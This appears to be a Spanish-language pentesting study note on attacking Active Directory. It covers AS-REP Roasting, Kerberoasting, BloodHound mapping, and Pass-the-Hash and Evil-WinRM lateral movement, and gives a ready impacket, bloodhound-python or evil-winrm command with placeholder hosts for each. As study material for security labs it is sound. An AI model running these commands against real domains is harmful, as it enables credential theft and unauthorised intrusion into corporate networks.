# 🏢 Knowledge Base: Active Directory

Fundamentos, vectores de ataque y abuso de configuraciones en entornos corporativos basados en Windows Server y Active Directory (AD).

---

## 🔑 Ataques Clave en Active Directory

### 1. AS-REP Roasting
* **Condición**: Cuentas de usuario con la opción *"Do not require Kerberos preauthentication"* activada.
* **Impacto**: Permite solicitar un ticket TGT sin conocer la contraseña y crackear el hash offline con `hashcat` o `john`.
* **Herramienta**:
  ```bash
  impacket-GetNPUsers dominio.local/ -usersfile usuarios.txt -format hashcat -outputfile asrep_hashes.txt
  ```

---

### 2. Kerberoasting
* **Condición**: Cuentas de usuario que tienen asignado un **SPN** (Service Principal Name), habitualmente usadas para ejecutar servicios como SQL Server o IIS.
* **Impacto**: Cualquier usuario autenticado en el dominio puede solicitar un ticket TGS y crackear la contraseña del servicio offline.
* **Herramienta**:
  ```bash
  impacket-GetUserSPNs dominio.local/usuario:password -dc-ip 10.10.10.X -request
  ```

---

### 3. BloodHound (Mapeo de Rutas de Ataque)
* Permite visualizar relaciones de confianza, grupos anidados, permisos ACL (GenericAll, WriteDacl) y caminos más cortos hacia `Domain Admins`.
* **Recolección**:
  ```bash
  bloodhound-python -u usuario -p password -d dominio.local -ns 10.10.10.X -c All
  ```

---

### 4. Movimiento Lateral
* **Pass-The-Hash (PtH)**:
  ```bash
  impacket-wmiexec -hashes :NTLM_HASH dominio.local/usuario@10.10.10.X
  ```
* **Evil-WinRM (WinRM habilitado puerto 5985)**:
  ```bash
  evil-winrm -i 10.10.10.X -u usuario -p password
  evil-winrm -i 10.10.10.X -u usuario -H NTLM_HASH
  ```
